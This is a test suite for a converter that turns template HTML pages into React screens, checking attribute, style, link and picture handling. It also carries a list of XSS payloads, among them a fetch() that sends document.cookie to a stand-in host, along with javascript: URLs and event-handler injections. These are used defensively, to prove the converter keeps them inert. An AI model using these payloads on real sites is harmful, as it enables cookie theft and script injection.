// SPDX-License-Identifier: AGPL-3.0-only
/**
 * A site template's page turned into a React screen: the mechanical conversion (attribute names,
 * styles, form defaults, links, pictures), what the page hands back as data, and the rules that
 * keep the template's words from ever running as code. Each hostile page is compiled with the real
 * esbuild and run against a stub React, and a careless converter is shown failing the same checks.
 */
import { createRequire } from 'node:module';
import { pathToFileURL } from 'node:url';

import { parse, type DefaultTreeAdapterMap } from 'parse5';
import { describe, expect, it } from 'vitest';

import { componentNameOf, ConvertRefusal, convertPage, PAGE_TSX_MAX, screenPathOf, type ConvertOptions, type PageImage } from '../src/designer/site/convert.js';

const SITE = new Set([
  'index.html',
  'about.html',
  'blog/index.html',
  'blog/post.html',
  'css/site.css',
  'js/app.js',
  'img/a.jpg',
  'img/a.webp',
  'img/b.png',
  'img/hero.png',
  'img/Hero.png',
  'img/logo-dark.png',
  'img/brand.png',
  'img/icon.svg',
  'img/fav.ico',
  'img/x.avif',
  'img/a@2x.jpg',
  'img/a"+alert(1)+".png',
  'files/menu.pdf',
]);
const PAGES: Record<string, string> = { 'index.html': '/', 'about.html': '/about', 'blog/index.html': '/blog', 'blog/post.html': '/blog/post' };

/** Every screen made here, compiled together at the end. */
const made: string[] = [];

const optionsFor = (more: Partial<ConvertOptions> = {}): ConvertOptions => ({
  page: 'index.html',
  has: (path) => SITE.has(path),
  screenOf: (path) => PAGES[path] ?? null,
  importOf: (path) => `../site/${path}`,
  component: 'HomePage',
  ...more,
});
const convert = (html: string, more: Partial<ConvertOptions> = {}) => {
  const page = convertPage(html, optionsFor(more));
  made.push(page.tsx);
  return page;
};
const pageOf = (body: string, more: Partial<ConvertOptions> = {}) => convert(`<!doctype html><html><head><title>T</title></head><body>${body}</body></html>`, more);
/** The JSX a body becomes, each line trimmed and joined with nothing between. */
const jsx = (body: string, more: Partial<ConvertOptions> = {}): string => {
  const lines = pageOf(body, more).tsx.split('\n');
  return lines
    .slice(lines.indexOf('    <>') + 1, lines.lastIndexOf('    </>'))
    .map((line) => line.trim())
    .join('');
};

// ---- the real esbuild, and a stub React to run what it builds ----

interface Esbuild {
  transform(code: string, options: Record<string, unknown>): Promise<{ code: string }>;
}
async function realEsbuild(): Promise<Esbuild> {
  const fromHere = createRequire(import.meta.url);
  const vite = createRequire(fromHere.resolve('vitest/package.json')).resolve('vite');
  const path = createRequire(vite).resolve('esbuild');
  const mod = (await import(pathToFileURL(path).href)) as Partial<Esbuild> & { default?: Esbuild };
  return typeof mod.transform === 'function' ? (mod as Esbuild) : (mod.default as Esbuild);
}
const esbuild = await realEsbuild();

interface El {
  type: unknown;
  props: Record<string, unknown>;
}
/** The compiled module run with a stub React; `touched` lists every reach for fetch, window, document or alert. */
function run(js: string): { tree: unknown; touched: string[] } {
  const touched: string[] = [];
  const trap = (name: string): object =>
    new Proxy(() => undefined, {
      get: (_, key) => {
        touched.push(`${name}.${String(key)}`);
        return undefined;
      },
      apply: () => {
        touched.push(`${name}()`);
        return undefined;
      },
    });
  const element = (type: unknown, props: Record<string, unknown>): El => ({ type, props });
  const runtime = { jsx: element, jsxs: element, Fragment: 'Fragment' };
  const load = (id: string): unknown => (id === 'react/jsx-runtime' ? runtime : id === '@adminiumjs/adminium/side' ? { Link: 'Link', Picture: 'Picture' } : `file:${id}`);
  const module = { exports: {} as Record<string, unknown> };
  const body = new Function('require', 'module', 'exports', 'fetch', 'window', 'document', 'alert', js) as (...args: unknown[]) => void;
  let tree: unknown = null;
  try {
    body(load, module, module.exports, trap('fetch'), trap('window'), trap('document'), trap('alert'));
    tree = (module.exports.default as () => unknown)();
  } catch (error) {
    touched.push(`threw ${(error as Error).message}`);
  }
  return { tree, touched };
}

const elementsOf = (tree: unknown): El[] => {
  if (Array.isArray(tree)) return tree.flatMap(elementsOf);
  if (tree === null || typeof tree !== 'object') return [];
  const el = tree as El;
  return [el, ...elementsOf(el.props.children)];
};
const textsOf = (tree: unknown): string[] => {
  if (typeof tree === 'string') return [tree];
  if (Array.isArray(tree)) return tree.flatMap(textsOf);
  if (tree === null || typeof tree !== 'object') return [];
  return textsOf((tree as El).props.children);
};

const FORBIDDEN_TYPES = new Set(['script', 'style', 'iframe', 'object', 'embed', 'applet', 'base', 'meta', 'link', 'frame', 'frameset', 'noscript', 'template', 'animate', 'set', 'animateMotion', 'animateTransform', 'foreignObject']);
const BAD_URL = /^[\s\p{Cc}]*(?:j[\s\p{Cc}]*a[\s\p{Cc}]*v[\s\p{Cc}]*a[\s\p{Cc}]*s[\s\p{Cc}]*c[\s\p{Cc}]*r[\s\p{Cc}]*i[\s\p{Cc}]*p[\s\p{Cc}]*t|data|vbscript|http)\s*:/iu;
/** The compiled JS with every string literal taken out: what is left is code. */
const codeOutsideStrings = (js: string): string => js.replace(/"(?:[^"\\\n]|\\.)*"|'(?:[^'\\\n]|\\.)*'|`(?:[^`\\]|\\.)*`/g, '""');

/** 'no-compile', 'ran' (the attacker's code ran), 'unsafe' (a dangerous element or address reached the page), or 'safe'. */
async function verdict(tsx: string): Promise<'no-compile' | 'ran' | 'unsafe' | 'safe'> {
  let js: string;
  try {
    js = (await esbuild.transform(tsx, { loader: 'tsx', jsx: 'automatic', format: 'cjs' })).code;
  } catch {
    return 'no-compile';
  }
  const code = codeOutsideStrings(js);
  if (/fetch\s*\(|alert\s*\(|\bwindow\b|\bdocument\b/.test(code)) return 'ran';
  const { tree, touched } = run(js);
  if (touched.length > 0) return 'ran';
  for (const el of elementsOf(tree)) {
    if (typeof el.type === 'string' && FORBIDDEN_TYPES.has(el.type)) return 'unsafe';
    for (const [key, value] of Object.entries(el.props)) {
      if (/^on/i.test(key) || /^(?:srcdoc|dangerouslySetInnerHTML|formaction|formAction|action)$/i.test(key)) return 'unsafe';
      if (typeof value === 'string' && key !== 'children' && BAD_URL.test(value)) return 'unsafe';
    }
  }
  return 'safe';
}

/** A careless converter: it splices the template's words and names straight into JSX. */
function naive(html: string): string {
  type Node = DefaultTreeAdapterMap['node'];
  const out = (node: Node): string => {
    if (node.nodeName === '#text' && 'value' in node) return node.value;
    if (!('tagName' in node)) return '';
    const attrs = node.attrs.map((attr) => (attr.value === '' ? ` ${attr.name}` : ` ${attr.name}="${attr.value}"`)).join('');
    return `<${node.tagName}${attrs}>${node.childNodes.map(out).join('')}</${node.tagName}>`;
  };
  const root = parse(html).childNodes.find((node) => node.nodeName === 'html');
  const body = root !== undefined && 'childNodes' in root ? root.childNodes.find((node) => node.nodeName === 'body') : undefined;
  const inner = body !== undefined && 'childNodes' in body ? body.childNodes.map(out).join('') : '';
  return `export default function Page() {\n  return (<>${inner}</>);\n}\n`;
}

// ---- the mechanical conversion ----

describe('attributes', () => {
  it('renames each HTML attribute React spells another way, and makes numbers numbers', () => {
    expect(jsx('<label for="e" class="c" tabindex="1" accesskey="k" contenteditable="true" spellcheck="false">L</label>')).toBe(
      '<label htmlFor={"e"} className={"c"} tabIndex={1} accessKey={"k"} contentEditable={"true"} spellCheck={"false"}>{"L"}</label>',
    );
    expect(jsx('<input maxlength="5" minlength="2" autocomplete="off" readonly>')).toBe('<input maxLength={5} minLength={2} autoComplete={"off"} readOnly={true} />');
    expect(jsx('<table><tbody><tr><td colspan="2" rowspan="3">x</td></tr></tbody></table>')).toContain('<td colSpan={2} rowSpan={3}>');
    expect(jsx('<img src="img/icon.svg" crossorigin="anonymous" usemap="#m" alt="">')).toBe('<img src={img1} crossOrigin={"anonymous"} useMap={"#m"} alt={""} />');
    expect(jsx('<input tabindex="first">')).toBe('<input />');
  });

  it('renames each SVG attribute to camelCase and keeps those already camel', () => {
    const out = jsx(
      '<svg viewBox="0 0 10 10" preserveAspectRatio="none"><g clip-path="url(#c)"><path fill-rule="evenodd" clip-rule="evenodd" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="4" stroke-dasharray="1 2" stroke-dashoffset="1" fill-opacity=".5" stroke-opacity=".5" d="M0 0"/></g>' +
        '<linearGradient id="g" gradientUnits="userSpaceOnUse" gradientTransform="rotate(9)"><stop offset="0" stop-color="#fff" stop-opacity="1"/></linearGradient>' +
        '<text font-size="9" font-family="serif" font-weight="700" text-anchor="middle" dominant-baseline="middle">Hi</text></svg>',
    );
    expect(out).toContain('<svg viewBox={"0 0 10 10"} preserveAspectRatio={"none"}>');
    expect(out).toContain('<g clipPath={"url(#c)"}>');
    expect(out).toContain(
      '<path fillRule={"evenodd"} clipRule={"evenodd"} strokeWidth={"2"} strokeLinecap={"round"} strokeLinejoin={"round"} strokeMiterlimit={"4"} strokeDasharray={"1 2"} strokeDashoffset={"1"} fillOpacity={".5"} strokeOpacity={".5"} d={"M0 0"} />',
    );
    expect(out).toContain('<linearGradient id={"g"} gradientUnits={"userSpaceOnUse"} gradientTransform={"rotate(9)"}><stop offset={"0"} stopColor={"#fff"} stopOpacity={"1"} /></linearGradient>');
    expect(out).toContain('<text fontSize={"9"} fontFamily={"serif"} fontWeight={"700"} textAnchor={"middle"} dominantBaseline={"middle"}>{"Hi"}</text>');
  });

  it('keeps aria-* and data-* as written, and marks boolean attributes true', () => {
    expect(jsx('<button aria-label="Go" data-step-id="2" disabled hidden>Go</button>')).toBe('<button aria-label={"Go"} data-step-id={"2"} disabled={true} hidden={true}>{"Go"}</button>');
    expect(jsx('<select multiple required><option>a</option></select>')).toBe('<select multiple={true} required={true}><option>{"a"}</option></select>');
    expect(jsx('<details open><summary>S</summary></details>')).toBe('<details open={true}><summary>{"S"}</summary></details>');
  });

  it('turns a style into an object with camelCase keys, keeping custom properties as they are', () => {
    expect(jsx('<div style="color: red; background-color:#fff ; --brand-color: blue; -webkit-transition: none; -ms-flex: 1; font-family: \'A; B\', serif"></div>')).toBe(
      '<div style={{ "color": "red", "backgroundColor": "#fff", "--brand-color": "blue", "WebkitTransition": "none", "msFlex": "1", "fontFamily": "\'A; B\', serif" }} />',
    );
    const page = pageOf('<p style="margin: 0 !important">x</p>');
    expect(page.tsx).toContain('<p style={{ "margin": "0" }}>');
    expect(page.dropped).toContain('!important in a style taken out');
  });

  it('turns a style url() of a site picture into its import, and any other url() into none', () => {
    const page = pageOf('<section style="background-image: url(img/b.png); background: url(\'https://cdn.example/x.png\') no-repeat"></section>');
    expect(page.tsx).toContain('<section style={{ "backgroundImage": "url(" + img1 + ")", "background": "none no-repeat" }} />');
    expect(page.tsx).toContain('import img1 from "../site/img/b.png";');
    expect(page.imports).toEqual(['img/b.png']);
    expect(page.dropped).toContain("a url() in a style that is not one of the site's pictures taken out");
  });
});

describe('the tree a browser builds', () => {
  it('closes void elements', () => {
    expect(jsx('<p>a<br>b</p><hr><wbr>')).toBe('<p>{"a"}<br />{"b"}</p><hr /><wbr />');
  });

  it('makes value and checked the defaults React expects, and a textarea its defaultValue', () => {
    expect(jsx('<input value="v"><input type="checkbox" value="yes" checked><input type="submit" value="Send">')).toBe(
      '<input defaultValue={"v"} /><input type={"checkbox"} value={"yes"} defaultChecked={true} /><input type={"submit"} value={"Send"} />',
    );
    expect(jsx('<textarea rows="3">\nHello\n there</textarea>')).toBe('<textarea rows={3} defaultValue={"Hello\\n there"} />');
    expect(jsx('<select><option>a</option><option value="b" selected>B</option></select>')).toBe('<select defaultValue={"b"}><option>{"a"}</option><option value={"b"}>{"B"}</option></select>');
  });

  it('drops a stray closing tag, decodes entities, and gives a table row its tbody', () => {
    expect(jsx('<div></span>text</div>')).toBe('<div>{"text"}</div>');
    expect(jsx('<p>a&nbsp;b &mdash; c&hellip;</p>')).toBe('<p>{"a\\u{a0}b — c…"}</p>');
    expect(jsx('<table>\n<tr><td>1</td></tr>\n</table>')).toBe('<table><tbody><tr><td>{"1"}</td></tr></tbody></table>');
  });

  it('writes whitespace between elements as one space, but keeps a <pre> as written', () => {
    expect(jsx('<b>a</b>\n   <i>b</i>')).toBe('<b>{"a"}</b>{" "}<i>{"b"}</i>');
    expect(jsx('<pre><b>a</b>\n  <i>b</i></pre>')).toBe('<pre><b>{"a"}</b>{"\\n  "}<i>{"b"}</i></pre>');
  });

  it('drops comments and unwraps an element not on the list, keeping its words', () => {
    const page = pageOf('<!-- note --><center><font color="red">Hi</font></center><my-widget>W</my-widget>');
    expect(page.tsx).not.toContain('note');
    expect(jsx('<center><font color="red">Hi</font></center><my-widget>W</my-widget>')).toBe('{"Hi"}{"W"}');
    expect(page.dropped).toEqual(['<center> taken off, its contents kept', '<font> taken off, its contents kept', '<my-widget> taken off, its contents kept']);
  });
});

describe('links', () => {
  it('turns a link to a site page into a Link, keeping its fragment', () => {
    const page = pageOf('<a href="about.html#team" class="nav">About</a><a href="/blog/">Blog</a><a href="about">Bare</a><a href="#top">Top</a>');
    expect(page.tsx).toContain("import { Link } from '@adminiumjs/adminium/side';");
    expect(jsx('<a href="about.html#team" class="nav">About</a><a href="/blog/">Blog</a><a href="about">Bare</a><a href="#top">Top</a>')).toBe(
      '<Link to={"/about#team"} className={"nav"}>{"About"}</Link><Link to={"/blog"}>{"Blog"}</Link><Link to={"/about"}>{"Bare"}</Link><a href={"#top"}>{"Top"}</a>',
    );
    expect(page.pages).toEqual(['about.html', 'blog/index.html']);
  });

  it('resolves against the page folder', () => {
    expect(jsx('<a href="../index.html">Home</a><a href="post.html?x=1">Post</a>', { page: 'blog/index.html', component: 'BlogPage' })).toBe(
      '<Link to={"/"}>{"Home"}</Link><Link to={"/blog/post"}>{"Post"}</Link>',
    );
    // Walking out of the site goes nowhere.
    expect(jsx('<a href="../../x.html">x</a>', { page: 'blog/index.html', component: 'BlogPage' })).toBe('<a href={"#"}>{"x"}</a>');
  });

  it('points a missing page at # and lists it', () => {
    const page = pageOf('<a href="missing.html">M</a>');
    expect(jsx('<a href="missing.html">M</a>')).toBe('<a href={"#"}>{"M"}</a>');
    expect(page.dropped).toEqual(['a link to missing.html, which the site does not hold, now goes nowhere']);
  });

  it('keeps mailto:, tel: and https: links, and imports a linked site picture', () => {
    expect(jsx('<a href="mailto:hi@example.com">m</a><a href="tel:+1555">t</a><a href="https://example.com/x?y=1">h</a><a href="img/a.jpg">big</a>')).toBe(
      '<a href={"mailto:hi@example.com"}>{"m"}</a><a href={"tel:+1555"}>{"t"}</a><a href={"https://example.com/x?y=1"}>{"h"}</a><a href={img1}>{"big"}</a>',
    );
  });

  it('takes out http:, other schemes, and a link to a site file that is not a page or picture', () => {
    const page = pageOf('<a href="http://example.com">h</a><a href="ftp://x">f</a><a href="files/menu.pdf">pdf</a>');
    expect(jsx('<a href="http://example.com">h</a><a href="ftp://x">f</a>')).toBe('<a>{"h"}</a><a>{"f"}</a>');
    expect(page.dropped).toEqual(['a http: link taken out', 'a ftp: link taken out', 'a link to files/menu.pdf, which the site does not hold, now goes nowhere']);
  });

  it('takes a form\u2019s action and method out', () => {
    const page = pageOf('<form action="send.php" method="post"><button formaction="other.php">Go</button></form>');
    expect(jsx('<form action="send.php" method="post"><button formaction="other.php">Go</button></form>')).toBe('<form><button>{"Go"}</button></form>');
    expect(page.dropped).toEqual(['action on <form> taken out (forms are wired later)', 'method on <form> taken out (forms are wired later)', 'formaction on <button> taken out (forms are wired later)']);
  });
});

describe('pictures', () => {
  const told: PageImage[] = [];
  const spotFor = (picture: PageImage): string | null => {
    told.push(picture);
    return picture.path === 'img/hero.png' ? 'hero' : null;
  };

  it('draws a spot when spotFor says so, keeping only className and style', () => {
    const page = pageOf('<img src="img/hero.png" alt="Hero" class="wide" style="max-width: 100%" width="1200" height="600" onerror="x()">', { spotFor });
    expect(page.tsx).toContain("import { Picture } from '@adminiumjs/adminium/side';");
    expect(jsx('<img src="img/hero.png" alt="Hero" class="wide" style="max-width: 100%">', { spotFor })).toBe('<Picture spot={"hero"} className={"wide"} style={{ "maxWidth": "100%" }} />');
    expect(page.imports).toEqual([]);
    expect(page.pictures).toEqual([{ path: 'img/hero.png', alt: 'Hero', width: 1200, height: 600, near: null, repeated: false, logo: false, spot: 'hero' }]);
    expect(page.dropped).toEqual(['onerror on <img> taken out']);
  });

  it('keeps an imported <img> when spotFor says no, or is absent', () => {
    const page = pageOf('<img src="img/b.png" alt="B">', { spotFor });
    expect(page.tsx).toContain('<img src={img1} alt={"B"} />');
    expect(page.pictures).toEqual([{ path: 'img/b.png', alt: 'B', width: null, height: null, near: null, repeated: false, logo: false, spot: null }]);
    expect(jsx('<img src="img/hero.png">')).toBe('<img src={img1} />');
  });

  it('always imports an SVG, ICO or AVIF picture, without asking', () => {
    told.length = 0;
    const page = pageOf('<img src="img/icon.svg"><img src="img/fav.ico"><img src="img/x.avif">', { spotFor });
    expect(told).toEqual([]);
    expect(page.pictures).toEqual([]);
    expect(page.imports).toEqual(['img/icon.svg', 'img/fav.ico', 'img/x.avif']);
  });

  it('takes the fallback <img> of a <picture> as the picture, dropping its sources', () => {
    const page = pageOf('<picture><source srcset="img/a.webp" type="image/webp"><img src="img/a.jpg" alt="A"></picture>');
    expect(jsx('<picture><source srcset="img/a.webp" type="image/webp"><img src="img/a.jpg" alt="A"></picture>')).toBe('<img src={img1} alt={"A"} />');
    expect(page.dropped).toEqual(['<source> in a <picture> taken out (its <img> is the picture)']);
  });

  it('keeps a srcset only when every candidate is a site picture', () => {
    expect(jsx('<img src="img/a.jpg" srcset="img/a.jpg 1x, img/a@2x.jpg 2x">')).toBe('<img src={img1} srcSet={img1 + " 1x" + ", " + img2 + " 2x"} />');
    const page = pageOf('<img src="img/a.jpg" srcset="img/a.jpg 1x, https://cdn.example/a.jpg 2x">');
    expect(page.tsx).toContain('<img src={img1} />');
    expect(page.dropped).toEqual(['srcset on <img> naming a picture the site does not hold taken out']);
  });

  it('tells spotFor what sits near the picture: a heading, a caption, a repeating card, a logo', () => {
    told.length = 0;
    pageOf(
      '<header><a href="index.html"><img src="img/brand.png" alt="Harbor"></a></header>' +
        '<h2>Our  team</h2><p><img src="img/a.jpg" alt="A"></p>' +
        '<figure><img src="img/b.png"><figcaption>The <b>harbor</b> at dawn</figcaption></figure>' +
        '<div class="grid"><div class="card"><a href="about.html"><img src="img/a.jpg"></a></div><div class="card"><a href="index.html"><img src="img/b.png"></a></div></div>' +
        '<div><div class="pair"><img src="img/b.png"></div><div class="pair"></div></div>' +
        '<img src="img/logo-dark.png">',
      { spotFor },
    );
    expect(told.map(({ path, near, repeated, logo }) => ({ path, near, repeated, logo }))).toEqual([
      { path: 'img/brand.png', near: null, repeated: false, logo: true },
      { path: 'img/a.jpg', near: 'Our team', repeated: false, logo: false },
      { path: 'img/b.png', near: 'The harbor at dawn', repeated: false, logo: false },
      { path: 'img/a.jpg', near: 'Our team', repeated: true, logo: false },
      { path: 'img/b.png', near: 'Our team', repeated: true, logo: false },
      { path: 'img/b.png', near: 'Our team', repeated: false, logo: false },
      { path: 'img/logo-dark.png', near: 'Our team', repeated: false, logo: true },
    ]);
  });

  it('takes the pictures of two cards of one shape as repeated, so neither becomes a spot', () => {
    const spotUnlessRepeated = (picture: PageImage): string | null => (picture.repeated ? null : 'spot');
    const cards =
      '<div class="row"><div class="product"><img src="img/a.jpg"><h3>Chair</h3><b>$50</b></div>' +
      '<div class="product"><img src="img/b.png"><h3>Table</h3><b>$90</b><span class="badge">Sale</span></div></div>';
    const page = pageOf(cards, { spotFor: spotUnlessRepeated });
    expect(page.pictures.map(({ path, repeated, spot }) => ({ path, repeated, spot }))).toEqual([
      { path: 'img/a.jpg', repeated: true, spot: null },
      { path: 'img/b.png', repeated: true, spot: null },
    ]);
    expect(page.tsx).not.toContain('<Picture');
  });

  it('keeps the pictures of a two-column layout with different content spots', () => {
    const spotUnlessRepeated = (picture: PageImage): string | null => (picture.repeated ? null : 'spot');
    const layout =
      '<div class="row"><div class="col-md-6"><img src="img/a.jpg"></div>' +
      '<div class="col-md-6"><h2>About us</h2><p>Words</p><img src="img/b.png"></div></div>';
    const page = pageOf(layout, { spotFor: spotUnlessRepeated });
    expect(page.pictures.map(({ path, repeated, spot }) => ({ path, repeated, spot }))).toEqual([
      { path: 'img/a.jpg', repeated: false, spot: 'spot' },
      { path: 'img/b.png', repeated: false, spot: 'spot' },
    ]);
  });

  it('numbers imports in order of first use, two files differing only in case apart', () => {
    const page = pageOf('<img src="img/Hero.png"><img src="img/hero.png"><img src="img/Hero.png">');
    expect(page.imports).toEqual(['img/Hero.png', 'img/hero.png']);
    expect(page.tsx).toContain('import img1 from "../site/img/Hero.png";\nimport img2 from "../site/img/hero.png";');
    expect(jsx('<img src="img/Hero.png"><img src="img/hero.png"><img src="img/Hero.png">')).toBe('<img src={img1} /><img src={img2} /><img src={img1} />');
  });

  it('takes out a picture from another site or a data: address', () => {
    const page = pageOf('<img src="https://cdn.example/a.png" alt="x"><img src="data:image/png;base64,AAAA">');
    expect(jsx('<img src="https://cdn.example/a.png" alt="x"><img src="data:image/png;base64,AAAA">')).toBe('<img alt={"x"} /><img />');
    expect(page.dropped).toEqual(['a https: address in src on <img> taken out', 'a data: address in src on <img> taken out']);
  });
});

describe('what the page hands back', () => {
  it('reads the title, lang, body class, stylesheets, styles and scripts', () => {
    const page = convert(
      '<!doctype html><html lang="en-GB"><head><title> Harbor \u202e&amp; Co\u0007 ' + 'x'.repeat(200) + '</title>' +
        '<link rel="stylesheet" href="css/site.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter"><link rel="icon" href="img/fav.ico">' +
        '<link rel="stylesheet" href="css/missing.css"><style>h1{color:red}</style><script src="js/app.js"></script><script>window.track()</script></head>' +
        '<body class="home  dark"><style>p{margin:0}</style><p>Hi</p><script>console.log(1)</script></body></html>',
    );
    expect(page.title).toBe(`Harbor & Co ${'x'.repeat(108)}`);
    expect(page.title).toHaveLength(120);
    expect(page.lang).toBe('en-GB');
    expect(page.bodyClass).toBe('home dark');
    expect(page.stylesheets).toEqual(['css/site.css']);
    expect(page.remoteStyles).toEqual(['fonts.googleapis.com']);
    expect(page.styles).toEqual(['h1{color:red}', 'p{margin:0}']);
    expect(page.scripts).toEqual([
      { src: 'js/app.js', text: null },
      { src: null, text: 'window.track()' },
      { src: null, text: 'console.log(1)' },
    ]);
    expect(page.dropped).toEqual([
      'a stylesheet link to css/missing.css, which the site does not hold, taken out',
      '<script> taken out',
      '<style> taken out (its rules are kept with the stylesheets)',
    ]);
    expect(page.tsx).toBe(
      [
        '// Made by Adminium Designer\'s use_site from the template\'s page "index.html": the markup and words are the template\'s.',
        '',
        'export default function HomePage() {',
        '  return (',
        '    <>',
        '      <p>',
        '        {"Hi"}',
        '      </p>',
        '    </>',
        '  );',
        '}',
        '',
      ].join('\n'),
    );
  });

  it('cuts an inline script to 4,000 characters, and says null for a page with no title or lang', () => {
    const page = convert(`<html lang="{x}"><body><script>${'a'.repeat(5000)}</script></body></html>`);
    expect(page.scripts[0]?.text).toHaveLength(4000);
    expect(page.title).toBeNull();
    expect(page.lang).toBeNull();
    expect(page.bodyClass).toBeNull();
  });

  it('refuses a page over 256 KB as a screen, naming it', () => {
    const big = `<p>${'word '.repeat(200)}</p>`.repeat(Math.ceil(PAGE_TSX_MAX / 1000));
    expect(() => pageOf(big, { page: 'about.html', component: 'AboutPage' })).toThrow(ConvertRefusal);
    expect(() => pageOf(big, { page: 'about.html', component: 'AboutPage' })).toThrow('about.html would be over 256 KB as a screen.');
  });

  it('refuses elements nested deeper than a browser would show', () => {
    expect(() => pageOf('<div>'.repeat(600))).toThrow('index.html nests its elements too deep to be a screen.');
  });
});

describe('names', () => {
  it('makes a component name and a screen address from a page path', () => {
    expect(componentNameOf('about-us.html')).toBe('AboutUsPage');
    expect(componentNameOf('index.html')).toBe('HomePage');
    expect(componentNameOf('404.html')).toBe('Page404');
    expect(componentNameOf('blog/index.html')).toBe('BlogPage');
    expect(componentNameOf('blog/my_post.htm')).toBe('BlogMyPostPage');
    expect(componentNameOf('caf\u00e9 "x"{y}.html')).toBe('CafeXYPage');
    expect(screenPathOf('index.html')).toBe('/');
    expect(screenPathOf('about.html')).toBe('/about');
    expect(screenPathOf('blog/index.html')).toBe('/blog');
    expect(screenPathOf('Blog/My Post.html')).toBe('/blog/my-post');
  });

  it('refuses a component name that is not one', () => {
    expect(() => pageOf('<p>x</p>', { component: 'x(){}' })).toThrow(TypeError);
  });
});

// ---- the template's words never run ----

/** Hostile pages: each must stay words, and the careless converter must fail on each. */
const HOSTILE: [name: string, body: string][] = [
  ['text written as JSX', "<p>{fetch('//x?'+document.cookie)}</p>"],
  ['text that closes a string', '<p>"}{alert(1)}{"</p><p>\\"}{alert(1)}{\\"</p>'],
  ['an attribute named as a spread', '<div {...window.x}>hi</div>'],
  ['an attribute value that closes the string', '<div class="&quot; onClick={alert(1)} x=&quot;">hi</div>'],
  ['a tag named with a brace', '<a{b>hi</a{b>'],
  ['a javascript: link', '<a href="javascript:alert(1)">x</a><a href=" ja&#x09;vascript:alert(1)">y</a><area href="JAVASCRIPT:alert(1)">'],
  ['a javascript: form action', '<form action="javascript:alert(1)"><button formaction="javascript:alert(1)">Go</button></form>'],
  ['a javascript: xlink:href', '<svg><use xlink:href="javascript:alert(1)"></use><image href="javascript:alert(1)"></image></svg>'],
  ['an iframe with srcdoc', '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>'],
  ['an SVG animate setting href', '<svg><a><animate attributeName="href" values="javascript:alert(1)"></animate><text>x</text></a></svg>'],
  ['an SVG set setting href', '<svg><a><set attributeName="href" to="javascript:alert(1)"></set><text>x</text></a></svg>'],
  ['an object', '<object data="javascript:alert(1)">fallback</object>'],
  ['an embed', '<embed src="javascript:alert(1)">'],
  ['a base', '<base href="javascript:alert(1)//">'],
  ['a meta refresh', '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">'],
  ['on… attributes', '<button onclick="alert(1)">b</button><img src="x" onerror="alert(1)"><svg onload="alert(1)"></svg>'],
  ['a data: page', '<a href="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;">d</a><img src="data:text/html,x">'],
];

describe('the template\u2019s words never run', () => {
  it.each(HOSTILE)('%s stays words in a screen that compiles', async (_, body) => {
    expect(await verdict(pageOf(body).tsx)).toBe('safe');
  });

  it.each(HOSTILE)('%s breaks a careless converter', async (_, body) => {
    expect(await verdict(naive(`<html><body>${body}</body></html>`))).not.toBe('safe');
  });

  it('shows the attacker\u2019s text as text', async () => {
    const js = (await esbuild.transform(pageOf("<p>{fetch('//x?'+document.cookie)}</p><p>a\u2028b</script></p>").tsx, { loader: 'tsx', jsx: 'automatic', format: 'cjs' })).code;
    expect(textsOf(run(js).tree)).toEqual(["{fetch('//x?'+document.cookie)}", 'a\u2028b']);
    expect(codeOutsideStrings(js)).not.toMatch(/fetch\(/);
  });

  it('lists what it took out', () => {
    const page = pageOf(HOSTILE.map(([, body]) => body).join(''));
    expect(page.dropped).toEqual([
      'an attribute with a name that is not HTML on <div> taken out',
      'an element with a name that is not HTML taken off, its contents kept',
      'a javascript: link taken out',
      'action on <form> taken out (forms are wired later)',
      'formaction on <button> taken out (forms are wired later)',
      'a javascript: address in xlink:href on <use> taken out',
      'a javascript: address in href on <image> taken out',
      '<iframe> taken out',
      '<a> taken off, its contents kept',
      '<animate> taken out',
      '<set> taken out',
      '<object> taken out',
      '<embed> taken out',
      '<base> taken out',
      '<meta http-equiv> taken out',
      'onclick on <button> taken out',
      "a address in src on <img> to x, which is not one of the site's pictures, taken out",
      'onerror on <img> taken out',
      'onload on <svg> taken out',
      'a data: link taken out',
      'a data: address in src on <img> taken out',
    ]);
  });

  it('keeps a hostile page name, picture name or style inside its strings', async () => {
    const page = pageOf('<img src="img/a&quot;+alert(1)+&quot;.png"><p style="color: red}} {...window.x} {{; font-family: &quot;a&quot; + alert(1) + &quot;b&quot;; a{b: c; background: u\\72l(javascript:alert(1))">x</p>', {
      page: 'x"\n alert(1)\u2028.html',
    });
    expect(page.tsx.split('\n')[0]).toBe('// Made by Adminium Designer\'s use_site from the template\'s page "x\\" alert(1).html": the markup and words are the template\'s.');
    expect(page.imports).toEqual(['img/a"+alert(1)+".png']);
    expect(await verdict(page.tsx)).toBe('safe');
    expect(page.dropped).toContain('a style with a name that is not CSS taken out');
    expect(page.dropped).toContain('a style background that may load a file taken out');
  });
});

describe('every screen made above', () => {
  it('compiles', async () => {
    expect(made.length).toBeGreaterThan(40);
    for (const tsx of made) await expect(esbuild.transform(tsx, { loader: 'tsx', jsx: 'automatic' })).resolves.toBeDefined();
  });
});
